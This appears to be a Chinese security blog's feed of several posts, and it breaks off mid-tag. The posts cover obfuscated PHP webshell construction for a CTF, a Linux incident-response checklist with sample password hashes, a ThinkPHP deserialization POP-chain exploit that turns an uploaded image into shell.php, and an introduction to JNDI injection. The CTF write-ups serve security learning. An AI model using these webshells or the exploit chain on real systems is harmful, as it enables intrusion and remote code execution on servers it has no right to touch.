data-src="/posts/bed5b94f/1586074826727.png" alt></p><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_12" target="_blank" rel="noopener">参考</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;&#x2F;&#x2F;_GET</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p><ul><li><code>?</code> 代表匹配一个字符</li><li>``` 表示执行命令</li><li><code>&quot;</code> 对特殊字符串进行解析</li></ul><p>这样就可以直接得到 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo &quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;</span><br><span class="line">_GET</span><br></pre></td></tr></table></figure><p>然后再构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]) &#x2F;&#x2F;$_GET[_]($_GET[__])</span><br></pre></td></tr></table></figure><p>这样就构造好了shell</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586075401555.png" alt></p><h2 id="通过取反"><a href="#通过取反" class="headerlink" title="通过取反"></a>通过取反</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">''</span>;</span><br><span class="line">$___=<span class="string">"瞰"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"的"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"半"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"始"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">'_'</span>;$___=<span class="string">"俯"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"瞰"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"次"</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">"站"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure><h2 id="通过加法运算"><a href="#通过加法运算" class="headerlink" title="通过加法运算"></a>通过加法运算</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/posts/e756113b/"/>
      <url>/posts/e756113b/</url>
      
        <content type="html"><![CDATA[<h2 id="相关命令补充"><a href="#相关命令补充" class="headerlink" title="相关命令补充"></a>相关命令补充</h2><h2 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><p>用户信息文件/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br></pre></td></tr></table></figure><p>注意：无密码只允许本机登陆，远程不允许登陆</p><p><code>/etc/shadow</code> 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI&#x2F;:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><p>相关命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who   查看当前登录用户（tty本地登陆 pts远程登录）</span><br><span class="line">w    查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime 查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><p>查找特权用户(UID=0)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>查找可以远程登陆的账号信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line">root:$6$ogEENApZAzc&#x2F;p2XN$TQ.P2pRw7IwUuYPMXymUH2fbGNrNqJutxiao3xAJpCSYlhjNCL1BYByO1W75i4I6ri1GWGu61VMqexIXw5s0l.:18298:0:99999:7:::</span><br><span class="line">pxy:$6$7LQL0eO&#x2F;Dk93UKqU$U9fSZEej9Dx1&#x2F;InOImWFsfRdtWW2dJHzWYhnBRJj79.NLVQ9og.5E0jAo7eYB.vmwR9PuYjND.e4yBWwhqVvq.:18253:0:99999:7:::</span><br></pre></td></tr></table></figure><p>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure><p>禁用或者删除可疑的账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usermod -L user  禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头</span><br><span class="line">userdel user    删除user用户</span><br><span class="line">userdel -r user  将删除user用户，并且将&#x2F;home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul><li><p><code>history</code> 查看历史命令</p></li><li><p>打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</p></li></ul><p>保存一万条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g&#39; &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>增加ip信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######jiagu history xianshi#########</span></span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk <span class="string">'&#123;print $NF&#125;'</span> | sed -e <span class="string">'s/[()]//g'</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$USER_IP</span>"</span> = <span class="string">""</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">USER_IP=`hostname`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> HISTTIMEFORMAT=<span class="string">"%F %T <span class="variable">$USER_IP</span> `whoami` "</span></span><br><span class="line"><span class="built_in">shopt</span> -s histappend</span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">"history -a"</span></span><br><span class="line"><span class="comment">######### jiagu history xianshi ##########</span></span><br></pre></td></tr></table></figure><p><code>source /etc/profile</code> 让配置生效</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参RCE构造</title>
      <link href="/posts/d6a47f52/"/>
      <url>/posts/d6a47f52/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化题目整理</title>
      <link href="/posts/4e7aaa07/"/>
      <url>/posts/4e7aaa07/</url>
      
        <content type="html"><![CDATA[<h2 id="qwb-upload"><a href="#qwb-upload" class="headerlink" title="qwb upload"></a>qwb upload</h2><p>当初学的时候挺难的，现在做起来觉得挺简单了</p><p>入口 <code>Register.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 <code>checker</code> 属性的 index 方法，如果不存在，就会调用某个类的 <code>__call</code> 方法</p><p>正好有一个 <code>Profile.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以通过 <code>__call</code> 去调用其他的方法了，这里我们选择</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>checker</code> 属性可控，<code>ext</code> 属性可控</p><p>进入到 <code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code> 即可将图片马改名</p><blockquote><p>这题复盘的时候比较玄学，挺难成功的</p></blockquote><p>调试过程</p><p><img src= "/img/loading.gif" data-src="/posts/4e7aaa07/1585910353276.png" alt></p><p>之后即可修改文件名</p><p><img src= "/img/loading.gif" data-src="/posts/4e7aaa07/1585910388138.png" alt></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($checker)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="comment"># 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER['REMOTE_ADDR'])/md5($_FILES['upload_file']['name']).".png"</span></span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">'./upload/2e25bf05f23b63a5b1f744933543d723/00bf23e130fa1e525e332ff03dae345d.png'</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'./upload/2e25bf05f23b63a5b1f744933543d723/shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">'index'</span> =&gt; <span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jndi入门</title>
      <link href="/posts/fe658142/"/>
      <url>/posts/fe658142/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。放两张直观的图</p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1.png" alt></p><p>从图中可以看出，JNDI相当于是更进一步的封装</p><p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-03-22 16:34</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.NamingManager;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">3001</span>);</span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:3001"</span>);</span><br><span class="line">        <span class="comment">////初始化</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="comment">//实例化person对象</span></span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setName(<span class="string">"pxy"</span>);</span><br><span class="line">        p.setPassword(<span class="string">"12345"</span>);</span><br><span class="line">        <span class="comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person，即我们可以通过person键值，来对Person对象进行索引</span></span><br><span class="line">        ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">        ctx.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="comment">//通过lookup查找person对象</span></span><br><span class="line">        Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        ctx.lookup("rmi://127.0.0.1:1099/Exploit");</span></span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        initPerson();</span><br><span class="line">        findPerson();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先生成一个工厂，然后将对象绑定上，再去访问</p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584867587547.png" alt></p><h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>上面的Demo里面，在初始化就预先指定了其上下文环境(RMI),但是在调用 lookup() 时，是可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 RMi的 URI 格式去<strong>转换</strong>(该变)上下文环境，使之访问 RMI 服务上的绑定对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person person = (Person) ctx.lookup(<span class="string">"rmi://localhost:3001/person"</span>);</span><br></pre></td></tr></table></figure><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>那么如果 <code>lookup</code> 的参数可控呢？</p><p>比如将其改为</p><figure class="highlight plain"><table><tr><td 